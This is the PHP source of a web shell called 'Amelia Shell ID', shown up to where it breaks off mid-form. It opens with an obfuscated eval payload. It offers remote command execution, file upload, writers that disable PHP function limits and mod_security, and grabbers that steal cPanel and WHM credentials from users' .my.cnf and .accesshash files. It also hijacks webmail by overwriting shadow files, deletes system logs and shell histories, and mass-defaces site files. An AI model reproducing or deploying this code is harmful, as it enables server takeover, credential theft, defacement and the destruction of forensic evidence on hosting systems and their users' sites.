<?php
error_reporting(0); ini_set('max_execution_time',0); session_start();  
eval(str_rot13(gzinflate(str_rot13(base64_decode('nUVdYoIwFP0rd4jShDiQD7eQPuBFKPtlw3aicyFgADcnlhrZcfG/76IPM1GXcn11e9t77zk9p8JTwas05obmdJyFGRdbrGOX2dAN7mH0cguZ62zAkjwMd5Esoi+BaGOR+EQacaIi74fU0bqqpmpIUNNIcQqZitk82vpskCcixB9NFSEdEpk9ha/jN4wBIV+LbBzzURR82yOuVKaVfHtAKB1ZIPcFNZt/yKpKEUqd+6KFgP4ZMsOJMX6/LMns9tyBWjgDT5kqPUUy7l07PiwSlLd/h78aOYpSgU+7ZX1reBv0UOY5COI5lEsObLDsgVSkJJpm0O9GP+jJF5yV6YejOIn8iM+2KeNv46L0cteQzmSjsnLbYZ/eym3fobSUVYImJzr9txF0m7AGO5Mv8sTcgaX1H0J6e9SzplKmi09xgIfoyPF0z5kKG6U09ijCGHOEQRTjRRWTYnC+/5DmNw==')))));
    ?>
<html>
	<head>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css" />

		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/4.0.6/sweetalert2.min.css" />

		<meta name="viewport" content="width=device-width, initial-scale=4, maximum-scale=0.6, user-scalable=no" />

		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous" />

		<meta name="theme-color" content="#263238" />

		<meta name="msapplication-navbutton-color" content="#263238" />

		<style>
@import url('https://fonts.googleapis.com/css?family=Abel|Didact+Gothic|Dosis|Monda|PT+Sans+Caption|Shadows+Into+Light|New+Rocker');		
   body{
   background:#263238;
   color:#FFFFFF;
   font-family:'Didact Gothic',sans-serif;
   font-size:17;
   }
input[type=submit] {
 background:#F44336;
 color:white;
 margin:0 10px;
  height:27px;
 width: 80px;
  border-radius:35px;
  font-size:17;
 border:none;
}   
input[type=submit]:hover {
  background:#D32F2F;
  color:white;
  margin:0 10px;
  height:27px;
  width: 80px;
  border-radius:35px;
  font-size:17;
  border:none;
  }
input[type=text], option, select { 
  padding:3px 3px 3px;
  border:1px solid #455A64; 
  height:27px;
  border-radius:40px;
  background:#263238;
  color:#FFFFFF;
}  
input[type=text]:hover{ 
  padding:3px 3px 3px;
  border:none;
  height:27px;
  background:#263238;
  color:#FFFFFF;
 
}  
input[type=email]{
  padding:4px 4px 4px 4px;
  border:none; 
  height:29px;
  border-radius:40px;
  background:#263238;
  color:lime;

}
 .bulat {
  width : 17px ;
  height : 17px ;
  border-radius : 50% ;
  float : left ; 
  margin : 14px 4px;
  border:none; 
}
.a {
  background : #FF0000 ;
}
.b{
  background :#FFF400;
}
.c{
  background : #00FF21 ;
}
.d{
 background:#FF0000;
}
.e{
background:lime;
}
.f{
background:yellow;
}
.head {
  width :100%; 
  margin :0; 
  background:#37474F;
  border-radius:15px; 
  height:40px;
  display : relative ; 
  }
.headtxt {
    color :white; 
    font-weight: bold ; 
    font-family:'Monda',sans-serif;
    text-align:left;
    padding : 12px;
}  
  a{
  text-decoration:none;
  color:white;
}
p{
color:#FFFFFF;
font-size:17;
font-family:'Didact Gothic',sans-serif;
}
placeholder{
color:white;
}
textarea{
background:#37474F;
color:#FFFFFF;
width:400px;
height:250px;
}
.fa-heart{
color:#FF0000;
}
.fa-folder-open{
color:#FFF400;
}
.fa-trash-alt{
color:#FF0000;
}
.fa-file-code{
color:#00F4FF;
}
.cmd{
width:500px;
height:250px;	
}
		</style>
	</head>
	<body translate="no" id="body" class="gelap">
		<div class="head">
			<button class="bulat a" onclick="about();" id="btn"></button>
			<button class="bulat b" onclick="kon()"></button>
			<button class="bulat c" onclick="Apsi()"></button>
			<div class="headtxt">
				root@arveyid

				<i class="fas fa-heart" onclick="asu()"></i>
			</div>
		</div>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/4.0.6/sweetalert2.min.js"></script>
		<script id="rendered-js">
function about() {
  swal({
    background:'#263238',
    html: "<center><img src='https://i.postimg.cc/Px33j7JC/symbols-41380-640.png'width='120px'height='120px'><br><br ><font color='lime'face='Monda'><b>Amelia Shell ID<br><font color='#FFF'>Gimana mau kalem kalau rasanya dalem ?<br>thanks to:<br>Restu ID - Con7ext - IndoXploit - 3xp1r3 Pr1nc3</b>",
    showCancelButton:false,
    showConfirmButton:false,
    showCloseButton:true,
  })
  };
function asu() {
  swal({
    title: 'Tools',
    background:'#263238',
    html: "<form method=post><input type=submit name=whmx value='Whm crk'><input type=submit name=logs value='Dllogs'/><input type=submit name=cpx value='Cp Grab'/><br><br><input type=submit name=asu value='Webmail'/></form>",
    showCancelButton:false,
    showConfirmButton:false,
    showCloseButton:true,
  })
  };
function kon() {
  swal({
    title: 'Bypass DF',
    background:'#263238',
    html: "<form method=post><input type=submit name=ini value='php.ini'/><input type=submit name=htce value='htaccess'/><input type=submit name=litini value='Litespd'/></form>",
    showCancelButton:false,
    showConfirmButton:false,
    showCloseButton:true,
  })
  };
  
		</script>
		<script id="rendered-js"> 
function Apsi() {
  swal({
    title: 'Mail Test',
    background:'#FFFFFF',
    html: '<form method="post">Mymail:<input type="email"autocomplete="off"name="email"placeholder="Your email"><br><br>Sender:<input type="email"autocomplete="off"name="sender"placeholder="mail@example.com"><br><br>Name :  <input type="text"name="name"placeholder="Shell Gans"><br><br>Subject<input type="text"name="subject"autocomplete="off"placeholder="Gak kamu ga UwU"><br><br><textarea rows=10 cols=30 name=content></textarea><br><br><input type="submit"class="but"value=">>"></form>',
    focusConfirm: false,
    showCancelButton:false,
    showConfirmButton:false,
    showCloseButton:true,
  })
  };  
  
		</script>
	</body>
</html>
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=green>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function sulap($text) {
  if(!get_magic_quotes_gpc()) {
    return $text;
	}
  return stripslashes($text);
}
function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#DD4736><b>".$disablefunc."</b></font></span>"; }
    else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
$getds = @ini_get("disable_functions");
$ds = showdisablefunctions().' <font color=white>on</font> <font color=teal>'.php_sapi_name().'</font>';
$mysql = (function_exists('mysql_connect')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#FF0000>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#FF0000>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#FF0000>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#FF0000>OFF</font>";
$python = (exe('python --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#FF0000>OFF</font>";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo "<center><br>
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($path,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form></center>";
	echo "".$act."";
$col="<font color='#F44336'>";
echo"<p>$col <b>Hostname</b>
:</font>".php_uname();
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=#FFFFFF>None</font>";
echo"$col <br> <b>Server IP :</b></font>".gethostbyname($_SERVER['HTTP_HOST']);
echo "<br>$col <b>User</font> :</b>".$user." (".$uid.") Group: ".$group." (".$gid.")";
echo "<br>$col<b> Disable :</b></font> $show_ds<br>";
echo"MySQL : ".$mysql." | Perl : ".$perl." | Python : ".$python." | WGET : ".$wget." | CURL : ".$curl."<br>";
echo"<b><a href='?path=$path&file=asu'>FILEMANAGER:<i class='fas fa-folder-open'></i></a></b></font>";
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo"<br><br><a href='?'><input type='submit'value='Home'></a>";
echo"<a href='?path=$path&go=ngindex'><input type='submit'value='MASS'></a>";
echo"<b><a href='?path=$path&kon=tol'><input type='submit'value='Kill Me'></a>";
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$path/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=green>Uploaded!</font> at <i><b>$path/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>Failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=green>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>Failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>Failed to upload file</font>";
			}
		}
	}
echo "<form method='post'>
" .$user." ~ <input type='text'name='cmd'autocomplete='off'><input type='submit'value='>>'><br><p align='left'>";
$cmd = $_REQUEST["cmd"];
if($cmd != "") print"<textarea class='cmd'>". shell_exec($cmd);
echo"</textarea>";
/*
Disable Functions
*/
    if(isset($_POST['ini']))
{

    $file = fopen("php.ini","w");
    echo"<center>". fwrite($file,"disable_functions=none
safe_mode = Off
  ");
    fclose($file);
    echo "<a href='php.ini'>click here!</a>";
}   if(isset($_POST['htce']))
{    
echo"<center>";
    $file = fopen(".htaccess","w");
    echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
  ");
    fclose($file);
    echo"htaccess successfully created!";
}              
 if(isset($_POST['litini'])){
    $iniph = '<? n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["file"]); n ini_restore("safe_mode"); n ini_restore("open_basedir"); n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["ss"]; n ?>';
       $byph = "safe_mode = Off n disable_functions= ";
    $comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
    file_put_contents("php.ini",base64_decode($byph));
    file_put_contents("ini.php",base64_decode($iniph));
    file_put_contents(".htaccess",base64_decode($comp));
    echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
    echo"</center>";
}
/*
Mail test
*/
$email = $_POST['email'];
$content = $_POST['content'];
$name = $_POST['name'];
$sender = $_POST['sender'];
$subject = $_POST['subject'];
$headers = "From: $name "."<".$sender.">\r\n";
mail($email, $subject, $content, $headers );
/*
Whm grab
*/
if(isset($_POST['whmx'])){
$whmx=$_POST['whmx'];
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}


echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> USER </th><th> | </th><th> Access Hash </th><th> .MY.CNF </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.accesshash';
$dirz1 = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz) && (dirz1)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
}

}
}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Whm Crack = '.$total.'</h3><br />';
echo '</center>';
}else{
echo "No WHM";}
}else{
echo"<center><br>";
echo "<i><font color='#FF0000'>ERROR</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf</font> Not Accessible!</i></div>";
}	
}
/*
WEBMAIL GRAB
*/
if(isset($_POST['asu'])){    
function smtp() { 
    $usr=get_current_user();
    $pass="arveyhaxor";
    $pwd=crypt($pass,'$6$roottn$');
    $maindir="/home/".$usr."/etc/";
    chdir($maindir);
    $dir=scandir($maindir);
    foreach($dir as $dirs) {
      if($dirs!="." && $dirs!="..") {
        chdir($dirs);
        if(is_readable(shadow)) {
          link("shadow","shadow.bak3x");
          $get=file_get_contents("shadow");
          $email=explode(":",$get);
          $mailname=$email[0];
          unlink("shadow");
          $file=fopen("shadow","a");
          fwrite($file,$mailname.":".$pwd.":16249:::::"."\r\nl");
          fclose($file);
          echo"<pre>WEBMAIL:<font color='lime'>".$mailname."@".$dirs."</font>:<font color='lime'>".$pass."<br /></pre></font>";
          chdir("..");
        }
      }
    }
}
smtp();
			}
		 /*
			Delete logs
			*/
if(isset($_POST['logs'])){
$logs=$_POST['logs'];
echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
	echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
	exec("rm -rf /tmp/logs");
	exec("rm -rf /root/.ksh_history");
	exec("rm -rf /root/.bash_history");
	exec("rm -rf /root/.bash_logout");
	exec("rm -rf /usr/local/apache/logs");
	exec("rm -rf /usr/local/apache/log");
	exec("rm -rf /var/apache/logs");
	exec("rm -rf /var/apache/log");
	exec("rm -rf /var/run/utmp");
	exec("rm -rf /var/logs");
	exec("rm -rf /var/log");
	exec("rm -rf /var/adm");
	exec("rm -rf /etc/wtmp");
	exec("rm -rf /etc/utmp");
	exec("rm -rf $HISTFILE");
	exec("rm -rf /var/log/lastlog");
	exec("rm -rf /var/log/wtmp");

	shell_exec("rm -rf /tmp/logs");
	shell_exec("rm -rf /root/.ksh_history");
	shell_exec("rm -rf /root/.bash_history");
	shell_exec("rm -rf /root/.bash_logout");
	shell_exec("rm -rf /usr/local/apache/logs");
	shell_exec("rm -rf /usr/local/apache/log");
	shell_exec("rm -rf /var/apache/logs");
	shell_exec("rm -rf /var/apache/log");
	shell_exec("rm -rf /var/run/utmp");
	shell_exec("rm -rf /var/logs");
	shell_exec("rm -rf /var/log");
	shell_exec("rm -rf /var/adm");
	shell_exec("rm -rf /etc/wtmp");
	shell_exec("rm -rf /etc/utmp");
	shell_exec("rm -rf $HISTFILE");
	shell_exec("rm -rf /var/log/lastlog");
	shell_exec("rm -rf /var/log/wtmp");

	passthru("rm -rf /tmp/logs");
	passthru("rm -rf /root/.ksh_history");
	passthru("rm -rf /root/.bash_history");
	passthru("rm -rf /root/.bash_logout");
	passthru("rm -rf /usr/local/apache/logs");
	passthru("rm -rf /usr/local/apache/log");
	passthru("rm -rf /var/apache/logs");
	passthru("rm -rf /var/apache/log");
	passthru("rm -rf /var/run/utmp");
	passthru("rm -rf /var/logs");
	passthru("rm -rf /var/log");
	passthru("rm -rf /var/adm");
	passthru("rm -rf /etc/wtmp");
	passthru("rm -rf /etc/utmp");
	passthru("rm -rf $HISTFILE");
	passthru("rm -rf /var/log/lastlog");
	passthru("rm -rf /var/log/wtmp");


	system("rm -rf /tmp/logs");
	sleep(2);
	echo'<br>Deleting .../tmp/logs ';
	sleep(2);

	system("rm -rf /root/.bash_history");
	sleep(2);
	echo'<p>Deleting .../root/.bash_history </p>';

	system("rm -rf /root/.ksh_history");
	sleep(2);
	echo'<p>Deleting .../root/.ksh_history </p>';

	system("rm -rf /root/.bash_logout");
	sleep(2);
	echo'<p>Deleting .../root/.bash_logout </p>';

	system("rm -rf /usr/local/apache/logs");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/logs </p>';

	system("rm -rf /usr/local/apache/log");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/log </p>';

	system("rm -rf /var/apache/logs");
	sleep(2);
	echo'<p>Deleting .../var/apache/logs </p>';

	system("rm -rf /var/apache/log");
	sleep(2);
	echo'<p>Deleting .../var/apache/log </p>';

	system("rm -rf /var/run/utmp");
	sleep(2);
	echo'<p>Deleting .../var/run/utmp </p>';

	system("rm -rf /var/logs");
	sleep(2);
	echo'<p>Deleting .../var/logs </p>';

	system("rm -rf /var/log");
	sleep(2);
	echo'<p>Deleting .../var/log </p>';

	system("rm -rf /var/adm");
	sleep(2);
	echo'<p>Deleting .../var/adm </p>';

	system("rm -rf /etc/wtmp");
	sleep(2);
	echo'<p>Deleting .../etc/wtmp </p>';

	system("rm -rf /etc/utmp");
	sleep(2);
	echo'<p>Deleting .../etc/utmp </p>';

	system("rm -rf $HISTFILE");
	sleep(2);
	echo'<p>Deleting ...$HISTFILE </p>'; 

	system("rm -rf /var/log/lastlog");
	sleep(2);
	echo'<p>Deleting .../var/log/lastlog </p>';

	system("rm -rf /var/log/wtmp");
	sleep(2);
	echo'<p>Deleting .../var/log/wtmp </p>';

	sleep(4);

	echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';
	echo"</td></tr></table>";
	}
/*
Grab cpanel
*/
	if(isset($_POST['cpx'])){
$cpx=$_POST['cpx'];
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}

echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."$l</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
}

}
}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
				}
            }
			}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">cpanel= '.$total.'</h3><br />';
echo '</center>';

}
}else{
echo "<br><i><font color='#FF0000'>ERROR !</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf</font> Not Accessible!</i></div>";
}
} elseif($_GET['kon'] == 'tol') {
/*
Delete shell
*/	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><center><img src="https://i.postimg.cc/Px33j7JC/symbols-41380-640.png"width="120px"height="120px"><br><br ><h2>Shell removed !!</h2><br>Gimana mau kalem kalau rasanya dalem</center>');
		else
			echo '<center>unlink failed!</center>';
} elseif($_GET['go'] == 'ngindex') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "<font color=lime>></font> $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
